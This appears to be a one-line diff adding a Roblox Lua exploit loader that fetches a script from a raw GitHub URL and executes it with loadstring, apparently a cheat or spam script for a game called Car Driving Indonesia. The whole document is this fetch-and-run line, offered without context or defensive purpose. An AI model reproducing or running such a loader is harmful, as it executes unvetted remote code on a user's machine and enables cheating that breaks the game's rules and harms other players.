@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/car-driving-indonesia-spam0-axfhrvevh06lg4.lua"))()
